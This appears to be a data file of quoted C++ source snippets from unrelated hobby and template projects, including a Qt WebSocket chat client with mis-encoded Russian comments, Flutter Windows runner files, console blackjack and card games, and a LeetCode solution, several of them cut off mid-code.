//\u00ef\u00f0\u00ee\u00e8\u00f1\u00f5\u00ee\u00e4\u00e8\u00f2 \u00f1\u00ee\u00e5\u00e4\u00e8\u00ed\u00e5\u00ed\u00e8\u00e5 \u00f1 \u00f1\u00e5\u00f0\u00e2\u00e5\u00f0\u00ee\u00ec, \u00f1 \u00f3\u00ea\u00e0\u00e7\u00e0\u00ed\u00e8\u00e5\u00ec \u00ef\u00f0\u00e8\u00f8\u00e5\u00e4\u00f8\u00e8\u00f5 \u00e4\u00e0\u00ed\u00ed\u00fb\u00f5 \u00e4\u00eb\u00ff \u00ef\u00ee\u00e4\u00ea\u00eb\u00fe\u00f7\u00e5\u00ed\u00e8\u00ff\r\n    socket->open(QUrl(QString(\"ws://\")+connectionData.first+QString(\":\")+connectionData.second));\r\n}\r\n\r\nvoid Client::messageWaitingLoop()\r\n{\r\n    QString message;\r\n    while(true){\r\n        cin.readLineInto(&message);\r\n        if(!message.isEmpty()){\r\n            qDebug() << \"You:\" << message;\r\n            emit needToSendMessage(message);\r\n        }\r\n    }\r\n}\r\n\r\n\r\nClient::~Client() //\u00ef\u00f0\u00ee\u00e8\u00f1\u00f5\u00ee\u00e4\u00e8\u00f2 \u00ee\u00f7\u00e8\u00f1\u00f2\u00ea\u00e0 \u00ef\u00e0\u00ec\u00ff\u00f2\u00e8 \u00ed\u00e0 \u00ea\u00f3\u00f7\u00e5, \u00e2\u00fb\u00e4\u00e5\u00eb\u00e5\u00ed\u00ed\u00ee\u00e9 \u00ef\u00ee\u00e4 \u00ea\u00eb\u00e8\u00e5\u00ed\u00f2\u00f1\u00ea\u00e8\u00e9 \u00f1\u00ee\u00ea\u00e5\u00f2 \u00e8 \u00ee\u00e1\u00fa\u00e5\u00ea\u00f2\u00e0 \u00ef\u00ee\u00f2\u00ee\u00ea\u00e0\r\n{\r\n    if(m_thread){\r\n        delete m_thread;\r\n    }\r\n    socket->deleteLater();\r\n}\r\n\r\nvoid Client::messageReceived(const QString &msg){ //\u00e2\u00fb\u00e2\u00ee\u00e4\u00e8\u00f2 \u00ed\u00e0 \u00fd\u00ea\u00f0\u00e0\u00ed \u00f1\u00ee\u00ee\u00e1\u00f9\u00e5\u00ed\u00e8\u00ff \u00ee\u00f2 \u00e4\u00f0\u00f3\u00e3\u00e8\u00f5 \u00ea\u00eb\u00e8\u00e5\u00ed\u00f2\u00ee\u00e2\r\n   qDebug() << msg;\r\n}\r\n\r\n\r\nvoid Client::serverMessageReceived(const QByteArray &bytes){ //\u00ee\u00f2\u00e2\u00e5\u00f7\u00e0\u00e5\u00f2 \u00e7\u00e0 \u00ee\u00e1\u00f0\u00e0\u00e1\u00ee\u00f2\u00ea\u00f3 \u00f1\u00ee\u00ee\u00e1\u00f9\u00e5\u00ed\u00e8\u00ff \u00ee\u00f2 \u00f1\u00e5\u00f0\u00e2\u00e5\u00f0\u00e0 \u00ee\u00e1 \u00f3\u00f1\u00ef\u00e5\u00f8\u00ed\u00ee\u00ec \u00ef\u00ee\u00e4\u00ea\u00eb\u00fe\u00f7\u00e5\u00ed\u00e8\u00e8 \u00e8 \u00e2\u00fb\u00e2\u00ee\u00e4\u00e8\u00f2 \u00f1\u00ee\u00ee\u00f2\u00e2\u00e5\u00f2\u00f1\u00f2\u00e2\u00f3\u00fe\u00f9\u00f3\u00fe \u00e8\u00ed\u00f4\u00ee\u00f0\u00ec\u00e0\u00f6\u00e8\u00fe \u00e2 \u00ea\u00ee\u00ed\u00f1\u00ee\u00eb\u00fc\r\n    QString str(bytes);\r\n    if(str==\"connected\"){\r\n        qDebug() << \"Successfully connected to server.\"\r\n                 << \"Now you can enter your message\";\r\n    }\r\n    m_thread = new std::thread(std::bind(&Client::messageWaitingLoop,this));\r\n}\r\n\r\n\r\n",
    "#include \"win32_window.h\"\n\n#include <dwmapi.h>\n#include <flutter_windows.h>\n\n#include \"resource.h\"\n\nnamespace {\n\n/// Window attribute that enables dark mode window decorations.\n///\n/// Redefined in case the developer's machine has a Windows SDK older than\n/// version 10.0.22000.0.\n/// See: https://docs.microsoft.com/windows/win32/api/dwmapi/ne-dwmapi-dwmwindowattribute\n#ifndef DWMWA_USE_IMMERSIVE_DARK_MODE\n#define DWMWA_USE_IMMERSIVE_DARK_MODE 20\n#endif\n\nconstexpr const wchar_t kWindowClassName[] = L\"FLUTTER_RUNNER_WIN32_WINDOW\";\n\n/// Registry key for app theme preference.\n///\n/// A value of 0 indicates apps should use dark mode. A non-zero or missing\n/// value indicates apps should use light mode.\nconstexpr const wchar_t kGetPreferredBrightnessRegKey[] =\n  L\"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Themes\\\\Personalize\";\nconstexpr const wchar_t kGetPreferredBrightnessRegValue[] = L\"AppsUseLightTheme\";\n\n// The number of Win32Window objects that currently exist.\nstatic int g_active_window_count = 0;\n\nusing EnableNonClientDpiScaling = BOOL __stdcall(HWND hwnd);\n\n// Scale helper to convert logical scaler values to physical using passed in\n// scale factor\nint Scale(int source, double scale_factor) {\n  return static_cast<int>(source * scale_factor);\n}\n\n// Dynamically loads the |EnableNonClientDpiScaling| from the User32 module.\n// This API is only needed for PerMonitor V1 awareness mode.\nvoid EnableFullDpiSupportIfAvailable(HWND hwnd) {\n  HMODULE user32_module = LoadLibraryA(\"User32.dll\");\n  if (!user32_module) {\n    return;\n  }\n  auto enable_non_client_dpi_scaling =\n      reinterpret_cast<EnableNonClientDpiScaling*>(\n          GetProcAddress(user32_module, \"EnableNonClientDpiScaling\"));\n  if (enable_non_client_dpi_scaling != nullptr) {\n    enable_non_client_dpi_scaling(hwnd);\n  }\n  FreeLibrary(user32_module);\n}\n\n}  // namespace\n\n// Manages the Win32Window's window class registration.\nclass WindowClassRegistrar {\n public:\n  ~WindowClassRegistrar() = default;\n\n  // Returns the singleton registrar instance.\n  static WindowClassRegistrar* GetInstance() {\n    if (!instance_) {\n      instance_ = new WindowClassRegistrar();\n    }\n    return instance_;\n  }\n\n  // Returns the name of the window class, registering the class if it hasn't\n  // previously been registered.\n  const wchar_t* GetWindowClass();\n\n  // Unregisters the window class. Should only be called if there are no\n  // instances of the window.\n  void UnregisterWindowClass();\n\n private:\n  WindowClassRegistrar() = default;\n\n  static WindowClassRegistrar* instance_;\n\n  bool class_registered_ = false;\n};\n\nWindowClassRegistrar* WindowClassRegistrar::instance_ = nullptr;\n\nconst wchar_t* WindowClassRegistrar::GetWindowClass() {\n  if (!class_registered_) {\n    WNDCLASS window_class{};\n    window_class.hCursor = LoadCursor(nullptr, IDC_ARROW);\n    window_class.lpszClassName = kWindowClassName;\n    window_class.style = CS_HREDRAW | CS_VREDRAW;\n    window_class.cbClsExtra = 0;\n    window_class.cbWndExtra = 0;\n    window_class.hInstance = GetModuleHandle(nullptr);\n    window_class.hIcon =\n        LoadIcon(window_class.hInstance, MAKEINTRESOURCE(IDI_APP_ICON));\n    window_class.hbrBackground = 0;\n    window_class.lpszMenuName = nullptr;\n    window_class.lpfnWndProc = Win32Window::WndProc;\n    RegisterClass(&window_class);\n    class_registered_ = true;\n  }\n  return kWindowClassName;\n}\n\nvoid WindowClassRegistrar::UnregisterWindowClass() {\n  UnregisterClass(kWindowClassName, nullptr);\n  class_registered_ = false;\n}\n\nWin32Window::Win32Window() {\n  ++g_active_window_count;\n}\n\nWin32Window::~Win32Window() {\n  --g_active_window_count;\n  Destroy();\n}\n\nbool Win32Window::Create(const std::wstring& title,\n                         const Point& origin,\n                         const Size& size) {\n  Destroy();\n\n  const wchar_t* window_class =\n      WindowClassRegistrar::GetInstance()->GetWindowClass();\n\n  const POINT target_point = {static_cast<LONG>(origin.x),\n                              static_cast<LONG>(origin.y)};\n  HMONITOR monitor = MonitorFromPoint(target_point, MONITOR_DEFAULTTONEAREST);\n  UINT dpi = FlutterDesktopGetDpiForMonitor(monitor);\n  double scale_factor = dpi / 96.0;\n\n  HWND window = CreateWindow(\n      window_class, title.c_str(), WS_OVERLAPPEDWINDOW,\n      Scale(origin.x, scale_factor), Scale(origin.y, scale_factor),\n      Scale(size.width, scale_factor), Scale(size.height, scale_factor),\n      nullptr, nullptr, GetModuleHandle(nullptr), this);\n\n  if (!window) {\n    return false;\n  }\n\n  UpdateTheme(window);\n\n  return OnCreate();\n}\n\nbool Win32Window::Show() {\n  return ShowWindow(window_handle_, SW_SHOWNORMAL);\n}\n\n// static\nLRESULT CALLBACK Win32Window::WndProc(HWND const window,\n                                      UINT const message,\n                                      WPARAM const wparam,\n                                      LPARAM const lparam) noexcept {\n  if (message == WM_NCCREATE) {\n    auto window_struct = reinterpret_cast<CREATESTRUCT*>(lparam);\n    S",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"profile\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "\r\n#include <iostream>\r\n#include <stdlib.h>\r\nint Choice;\r\nint HitFunction(int PlayerHitHand);\r\nint SplitHitFunction(int SplitHitHand1);\r\nint SplitHit2Function(int SplitHitHand2);\r\nint SplitStay(int DealerHand);\r\nint StayFunction(int DealerStayHand);\r\nusing std::cout;\r\nusing std::cin;\r\nusing std::endl;\r\nint main()\r\n{\r\n\tsrand(static_cast<int>(time(NULL)));\r\n\tbool Play = true;\r\n\tbool Splitplay = false;\r\n\tint DealerCard1 = rand() % 11 + 1;\r\n\tint DealerCard2 = rand() % 11 + 1;\r\n\tint PlayerCard1 = rand() % 11 + 1;\r\n\tint PlayerCard2 = rand() % 11 + 1;\r\n\tint PlayerCard3 = rand() % 11 + 1;\r\n\tint PlayerCard4 = rand() % 11 + 1;\r\n\tint DealerHand = DealerCard1 + DealerCard2;\r\n\tint PlayerHand = PlayerCard1 + PlayerCard2;\r\n\tif (PlayerCard1 && PlayerCard2 == 11)\r\n\t{\r\n\t\tPlayerCard1 -= 1;\r\n\t\tcout << \"Playercard1 is now equal to: \" << PlayerCard1 << endl;\r\n\t}\r\n\tif (DealerCard1 && DealerCard2 == 11)\r\n\t{\r\n\t\tDealerCard1 -= 1;\r\n\t\tcout << \"Dealercard1 is now equal to: \" << DealerCard1 << endl;\r\n\t}\r\n\tif (DealerHand == 21)\r\n\t{\r\n\t\tcout << \"Dealer has a natural blackjack you lose!\" << endl;\r\n\t\tPlay = false;\r\n\t\tSplitplay = false;\r\n\t\treturn 0;\r\n\t}\r\nif (PlayerCard1 == PlayerCard2 || Splitplay == true)\r\n{\r\n\t\t\r\nchar YesNo;\r\ncout << \"Your first card: \" << PlayerCard1 << \" \" << \"Your second card: \" << PlayerCard2 << endl;\r\ncout << \"Would you like to split?\" << endl;\r\ncout << \"Y/N\" << endl;\r\ncin >> YesNo;\r\nint PlayerHandSplit1 = PlayerCard1 + PlayerCard3;\r\nint PlayerHandSplit2 = PlayerCard2 + PlayerCard4;\r\nif (YesNo == 'Y' || YesNo == 'y')\r\n{\r\n\tdo\r\n\t{\r\n\t\tbool Hit1 = true;\r\n\t\tbool Hit = true;\r\n\t\tSplitplay = true;\r\n\t\tcout << \"Spliting...\" << endl;\r\n\t\tcout << \"Dealer:\" << endl;\r\n\t\tcout << DealerHand << endl;\r\n\t\tcout << \"Playercard 1: \" << PlayerCard1 << \" \" << \"Playercard 2: \" << PlayerCard2 <<\r\n\t\t\" \" << \"Playercard 3: \" << PlayerCard3 << \" \" << \"Playercard 4: \" << PlayerCard4 << endl;\r\n\t\tcout << \"Playerhand 1: \" << PlayerHandSplit1 << \" \" << \" Playerhand 2: \" << PlayerHandSplit2 << endl;\r\n\t\tcout << \"Would you like to hit?\" << endl;\r\n\t\tcout << \"1)Hit\" << endl;\r\n\t\tcout << \"2)Stay\" << endl;\r\n\t\tcin >> Choice;\r\n\tswitch (Choice)\r\n\t{\r\n\tcase 1:\r\n\twhile (Hit1)\r\n\t{\r\n\t\tPlayerHandSplit1 += SplitHitFunction(PlayerHandSplit1);\r\n\t\tcout << \"Dealer:\" << endl;\r\n\t\tcout << DealerHand << endl;\r\n        \tcout << \"Playercard 1: \" << PlayerCard1 << \" \" << \"Playercard 2: \" << PlayerCard2 << \" \"\r\n\t\t<< \"Playercard 3: \" << PlayerCard3 << \" \" << \"Playercard 4: \" << PlayerCard4 << endl;\r\n\t\tcout << \"Playerhand 1: \" << PlayerHandSplit1 << \" \" << \" Playerhand 2: \" << PlayerHandSplit2 << endl;\r\n\tif (PlayerHandSplit1 > 21 || PlayerHandSplit2 > 21)\r\n\t{\r\n\t\tcout << \"You busted! You lose!\" << endl;\r\n\t\tcout << \"Dealer:\" << endl;\r\n\t\tcout << DealerHand << endl;\r\n\t\tcout << \"Playercard 1: \" << PlayerCard1 << \" \" << \"Playercard 2: \" << PlayerCard2 << \" \"\r\n\t\t<< \"Playercard 3: \" << PlayerCard3 << \" \" << \"Playercard 4: \" << PlayerCard4 << endl;\r\n\t\tcout << \"Playerhand 1: \" << PlayerHandSplit1 << \" \" << \" Playerhand 2: \" << PlayerHandSplit2 << endl;\r\n\t\tSplitplay = false;\r\n\t\tHit1 = false;\r\n\t}\r\n\tchar YesNo;\r\n\tcout << \"Would you like to hit again?\" << endl;\r\n\tcout << \"Y/N?\" << endl;\r\n\tcin >> YesNo;\r\n\tif (YesNo == 'Y' || YesNo == 'y')\r\n\t{\r\n\r\n\t}\r\n\telse\r\n\t{\r\n\t\tHit1 = false;\r\n\t}\r\n\t}\r\n\tbreak;\r\n\tcase 2:\r\n\twhile (DealerHand <= 16)\r\n\t{\r\n\t\tDealerHand += SplitStay(PlayerHandSplit1);\r\n\t\tcout << \"Dealer:\" << endl;\r\n\t\tcout << DealerHand << endl;\r\n\t\tcout << \"Player:\" << endl;\r\n\t\tcout << \"Playercard 1: \" << PlayerCard1 << \" \" << \"Playercard 2: \" << PlayerCard2\r\n\t\t<< \" \" << \"Playercard 3: \" << PlayerCard3 << \" \" << \"Playercard 4: \" << PlayerCard4 << endl;\r\n\t\tcout << \"Playerhand 1: \" << PlayerHandSplit1 << \" \" << \" Playerhand 2: \" << PlayerHandSplit2 << endl;\r\n\t\tHit1 = false;\r\n\t\tSplitplay = false;\r\n\t\tPlay = false;\r\n\tif (DealerHand > 21)\r\n\t{\r\n\t\tcout << \"Dealer busted! You win!\" << endl;\r\n\t\tcout << \"Dealer:\" << endl;\r\n\t\tcout << DealerHand << endl;\r\n\t\tcout << \"Playercard 1: \" << PlayerCard1 << \" \" << \"Playercard 2: \" << PlayerCard2 << \" \"\r\n\t\t<< \"Playercard 3: \" << PlayerCard3 << \" \" << \"Playercard 4: \" << PlayerCard4 << endl;\r\n\t\tcout << \"Playerhand 1: \" << PlayerHandSplit1 << \" \" << \" Playerhand 2: \" << PlayerHandSplit2 << endl;\r\n\t\tSplitplay = false;\r\n\t\tHit = false;\r\n\t\tPlay = false;\r\n\t}\r\n\t}\r\n\t\t\t\t\t\t\r\n\tbreak;\r\n\tdefault:\r\n\tbreak;\r\n\t}\r\n\tif (Play == true)\r\n\t{\r\n\t\tcout << \"Spliting...\" << endl;\r\n\t\tcout << \"Dealer:\" << endl;\r\n\t\tcout << DealerHand << endl;\r\n\t\tcout << \"Playercard 1: \" << PlayerCard1 << \" \" << \"Playercard 2: \" << PlayerCard2 <<\r\n\t\t\" \" << \"Playercard 3: \" << PlayerCard3 << \" \" << \"Playercard 4: \" << PlayerCard4 << endl;\r\n\t\tcout << \"Playerhand 1: \" << PlayerHandSplit1 << \" \" << \" Playerhand 2: \" << PlayerHandSplit2 << endl;\r\n\t\tcout << \"For second hand hit?\" << endl;\r\n\t\tcout << \"Would you like to hit?\" << endl;\r\n\t\tcout << \"1)Hit\" << endl;\r\n\t\tcout << \"2)Stay\" << endl;\r\n\t\tcin >> Choice;\r\n\tswitch (Choice)\r\n\t{\r\n\tcase 1:\r\n\twhile (Hit)\r\n\t{\r\n\t\tPlayerHandSplit2 += SplitHit2Function(PlayerHandSplit2);\r\n\t\tcout << \"Dealer:\" ",
    "class Solution {\npublic:\n    vector<long long> maximumSegmentSum(vector<int>& nums, vector<int>& removeQueries) {\n        int n = nums.size();\n        multiset<long long> s;\n        s.insert(0);\n        set<pair<int, int>> in;\n        vector<long long> pre(n, nums[0]);\n        for(int i = 1; i < n; i++) pre[i] = pre[i - 1] + nums[i];\n        \n        in.insert({0, n - 1});\n        \n        s.insert(pre[n - 1]);\n        \n        vector<long long> ans;\n        for(auto p : removeQueries) {\n            auto it = in.upper_bound({p, 2e9});\n            it--;\n            \n            long long L = (p ? pre[p - 1] : 0) - (it -> first ? pre[it -> first - 1] : 0);\n            long long R = pre[it -> second] - pre[p];\n            long long T = pre[it -> second] - (it -> first ? pre[it -> first - 1] : 0);\n            \n            s.erase(s.find(T));\n            if(it -> first <= p - 1) {\n                in.insert({it -> first, p - 1});\n                s.insert(L);\n            }\n            if(it -> second >= p + 1) {\n                in.insert({p + 1, it -> second});\n                s.insert(R);\n            }\n            \n            in.erase(it);\n            ans.push_back(*s.rbegin());\n        }\n        return ans;\n    }\n};\n",
    "#include \"flutter_window.h\"\n\n#include <optional>\n\n#include \"flutter/generated_plugin_registrant.h\"\n\nFlutterWindow::FlutterWindow(const flutter::DartProject& project)\n    : project_(project) {}\n\nFlutterWindow::~FlutterWindow() {}\n\nbool FlutterWindow::OnCreate() {\n  if (!Win32Window::OnCreate()) {\n    return false;\n  }\n\n  RECT frame = GetClientArea();\n\n  // The size here must match the window dimensions to avoid unnecessary surface\n  // creation / destruction in the startup path.\n  flutter_controller_ = std::make_unique<flutter::FlutterViewController>(\n      frame.right - frame.left, frame.bottom - frame.top, project_);\n  // Ensure that basic setup of the controller was successful.\n  if (!flutter_controller_->engine() || !flutter_controller_->view()) {\n    return false;\n  }\n  RegisterPlugins(flutter_controller_->engine());\n  SetChildContent(flutter_controller_->view()->GetNativeWindow());\n\n  flutter_controller_->engine()->SetNextFrameCallback([&]() {\n    this->Show();\n  });\n\n  return true;\n}\n\nvoid FlutterWindow::OnDestroy() {\n  if (flutter_controller_) {\n    flutter_controller_ = nullptr;\n  }\n\n  Win32Window::OnDestroy();\n}\n\nLRESULT\nFlutterWindow::MessageHandler(HWND hwnd, UINT const message,\n                              WPARAM const wparam,\n                              LPARAM const lparam) noexcept {\n  // Give Flutter, including plugins, an opportunity to handle window messages.\n  if (flutter_controller_) {\n    std::optional<LRESULT> result =\n        flutter_controller_->HandleTopLevelWindowProc(hwnd, message, wparam,\n                                                      lparam);\n    if (result) {\n      return *result;\n    }\n  }\n\n  switch (message) {\n    case WM_FONTCHANGE:\n      flutter_controller_->engine()->ReloadSystemFonts();\n      break;\n  }\n\n  return Win32Window::MessageHandler(hwnd, message, wparam, lparam);\n}\n",
    "#include \"flutter_window.h\"\n\n#include <optional>\n\n#include \"flutter/generated_plugin_registrant.h\"\n\nFlutterWindow::FlutterWindow(const flutter::DartProject& project)\n    : project_(project) {}\n\nFlutterWindow::~FlutterWindow() {}\n\nbool FlutterWindow::OnCreate() {\n  if (!Win32Window::OnCreate()) {\n    return false;\n  }\n\n  RECT frame = GetClientArea();\n\n  // The size here must match the window dimensions to avoid unnecessary surface\n  // creation / destruction in the startup path.\n  flutter_controller_ = std::make_unique<flutter::FlutterViewController>(\n      frame.right - frame.left, frame.bottom - frame.top, project_);\n  // Ensure that basic setup of the controller was successful.\n  if (!flutter_controller_->engine() || !flutter_controller_->view()) {\n    return false;\n  }\n  RegisterPlugins(flutter_controller_->engine());\n  SetChildContent(flutter_controller_->view()->GetNativeWindow());\n\n  flutter_controller_->engine()->SetNextFrameCallback([&]() {\n    this->Show();\n  });\n\n  // Flutter can complete the first frame before the \"show window\" callback is\n  // registered. The following call ensures a frame is pending to ensure the\n  // window is shown. It is a no-op if the first frame hasn't completed yet.\n  flutter_controller_->ForceRedraw();\n\n  return true;\n}\n\nvoid FlutterWindow::OnDestroy() {\n  if (flutter_controller_) {\n    flutter_controller_ = nullptr;\n  }\n\n  Win32Window::OnDestroy();\n}\n\nLRESULT\nFlutterWindow::MessageHandler(HWND hwnd, UINT const message,\n                              WPARAM const wparam,\n                              LPARAM const lparam) noexcept {\n  // Give Flutter, including plugins, an opportunity to handle window messages.\n  if (flutter_controller_) {\n    std::optional<LRESULT> result =\n        flutter_controller_->HandleTopLevelWindowProc(hwnd, message, wparam,\n                                                      lparam);\n    if (result) {\n      return *result;\n    }\n  }\n\n  switch (message) {\n    case WM_FONTCHANGE:\n      flutter_controller_->engine()->ReloadSystemFonts();\n      break;\n  }\n\n  return Win32Window::MessageHandler(hwnd, message, wparam, lparam);\n}\n",
    "#include <iostream>\r\n#include <vector>\r\n#include <stdlib.h>\r\n#include <time.h>\r\n#include <iomanip>\r\n#include <conio.h>\r\n\r\nusing namespace std;\r\n\r\n\r\nstruct kart{\r\n    string type;\r\n    int point;\r\n};\r\n\r\nstruct player{\r\n    string name;\r\n    int point = 0;\r\n    vector<kart> kart_mojod;\r\n    vector<kart> kart_nemayesh_mordegan;\r\n};\r\n\r\n\r\nvector<kart> karts;\r\n\r\nint max_point;\r\nint player_number;\r\n\r\nvoid control_unit(player *);\r\nvoid meghdardehi_player(vector<kart> *);\r\nvoid play_game(player *);\r\nvoid what_max_point();\r\nvoid signin_player(player *);\r\nvoid start();\r\nvoid amaliat(player * , int  , bool &);\r\nvoid show_kartsgame(player * , int  , bool & );\r\nbool shart_emtiaz(player );\r\nvoid shomaresh_emtiaz(player *);\r\nbool shart_edame(player *);\r\nvoid tozie_kart(player *);\r\nint win_player_f(player *);\r\nvoid show_table(player *);\r\nvoid sort_players(player *);\r\nvoid end_game(player *);\r\nvoid show_curentkarts(vector<kart> );\r\n\r\nvoid meghdardehi_kartha(){\r\n    srand(time(0));\r\n    kart kohnepich[30];\r\n    kart kalekado[30];\r\n    kart gorbegor[30];\r\n\r\n    for(int i=0 ; i<30 ; i++){\r\n        \r\n        kohnepich[i].type = \"kohne pich\";\r\n        kohnepich[i].point = (rand() % 15) + 1;\r\n        kalekado[i].type = \"kale kadoo\";\r\n        kalekado[i].point = (rand() % 15) + 1;\r\n        gorbegor[i].type = \"gor be gor\";\r\n        gorbegor[i].point = (rand() % 15) + 1;\r\n    }\r\n\r\n    for(int i=0 ; i<30 ; i++)\r\n    {\r\n        karts.push_back(kohnepich[i]);\r\n        karts.push_back(kalekado[i]);\r\n        karts.push_back(gorbegor[i]);\r\n    }\r\n}\r\n\r\nint main()\r\n{   \r\n    system(\"cls\");\r\n    cout << \"\\n\\n\\n\\n be bazi kastel khoshomadid.\\n\";\r\n    cout << \"\\n\\n\\n\\t main menu\\n\";\r\n    cout << \"\\n 1-shoroe bazi jadid\\n 2-exit\\n\\nentekhab: \";\r\n    int ch;\r\n    cin >> ch;\r\n\r\n    switch (ch)\r\n    {\r\n    case 1: start();break;\r\n    case 2: return 0; break;\r\n    default:\r\n        cout << \"entekhab eshtebah ast.\";\r\n        getch();\r\n        main();\r\n    }\r\n}\r\n\r\nvoid what_max_point()\r\n{\r\n    cout << \"hadaxar emtiaz bazi chand bashad? \";\r\n    cin >> max_point;\r\n}\r\n\r\nvoid signin_player(player *p)\r\n{\r\n\r\n    for(int i=0 ; i<player_number ; i++){\r\n        cout << \"name bazikon shomare \" << i+1 << \" ra vared konid: \";\r\n        cin >> p[i].name ;\r\n    }\r\n}\r\n\r\nvoid meghdardehi_player(vector<kart> *k){\r\n    srand(time(0));\r\n    int count = (rand() % (karts.size()-1));\r\n    while(k->size() < 3){\r\n        k->push_back(karts[count]);\r\n        karts.erase(karts.begin()+count);\r\n    }\r\n}\r\n\r\nvoid amaliat(player *p , int i , bool &b)\r\n{\r\n    cout << \"shomare kart mored nazar az dast khod ra entekhab konid: \";\r\n    int choosen;\r\n    cin >> choosen;\r\n\r\n    cout << \"shomare daste kart mored nazar barai entaghal kart entekhab shode ra entekhab konid: \";\r\n    int row_choosen;\r\n    cin >> row_choosen;\r\n\r\n    cout << \"shomare kart mored nazar dar dastekart entekhab shode barai entaghal kart ra entekhab konid: \";\r\n    int kart_gharargiri;\r\n    cin >> kart_gharargiri;\r\n\r\n    if(!(choosen >= 1 && choosen <= 3) || !(row_choosen >= 1 && row_choosen <= player_number) || !(kart_gharargiri >= 1 && kart_gharargiri <= 6))\r\n    {\r\n        cout << \"adad vorodi eshtebah ast.\";\r\n        getch();\r\n        show_kartsgame(p , i , b);\r\n    }\r\n    else if(p[row_choosen-1].kart_nemayesh_mordegan.size() < kart_gharargiri){\r\n        p[row_choosen-1].kart_nemayesh_mordegan.push_back(p[i].kart_mojod[choosen-1]);\r\n        p[i].kart_mojod.erase(p[i].kart_mojod.begin() + choosen-1);\r\n    }\r\n    else if(p[row_choosen-1].kart_nemayesh_mordegan[kart_gharargiri-1].type == p[i].kart_mojod[choosen-1].type){\r\n        \r\n        bool u = 1;\r\n        for(auto &j : p[row_choosen-1].kart_nemayesh_mordegan){\r\n            \r\n            if(j.type == p[i].kart_mojod[choosen-1].type && j.point == p[i].kart_mojod[choosen-1].point){\r\n                j = p[i].kart_mojod[choosen-1];\r\n                u = 0;\r\n            }\r\n        }\r\n        if(u)\r\n            p[row_choosen-1].kart_nemayesh_mordegan[kart_gharargiri-1] =  p[i].kart_mojod[choosen-1];\r\n        \r\n        p[i].kart_mojod.erase(p[i].kart_mojod.begin() + choosen-1);\r\n    }\r\n    \r\n    else{\r\n        cout << \"kart ha ba ham, ham type nistand. bayad kart hai entekhab shode ham type va ham noe bashand.\\n\";\r\n        getch();\r\n        show_kartsgame(p , i , b);\r\n    }\r\n    \r\n    if(p[row_choosen-1].kart_nemayesh_mordegan.size() == 6 || p[i].kart_mojod.size() == 0) b = 1;\r\n}\r\n\r\nvoid show_curentkarts(vector<kart> curentkart){\r\n    cout << \"\\t\\t\\t  +\\t\\t\\t\";\r\n    for(int k=0 ; k<3 ; k++){\r\n        cout << setfill('-') << setw(16) << \"  \";\r\n    }\r\n    cout << setfill(' ') << setw(29) <<'+' << endl;\r\n    for(int l=0 ; l<7 ; l++){\r\n        if(l == 2){\r\n            cout << \"\\t\\t\\t  +\\t\\t\\t\";\r\n            for(int k=0 ; k<curentkart.size() ; k++){\r\n                cout << \"| \" << curentkart[k].type << \" |  \";\r\n            }\r\n            \r\n            cout << setfill(' ') << setw(29) <<'+' << endl;\r\n        }\r\n        else if(l == 4){\r\n            cout << \"\\t\\t\\t  +\\t\\t\\t\";\r\n",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"flutter_firebase\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"blog_app\", origin, size)) {\n    return EXIT_FAILURE;\n  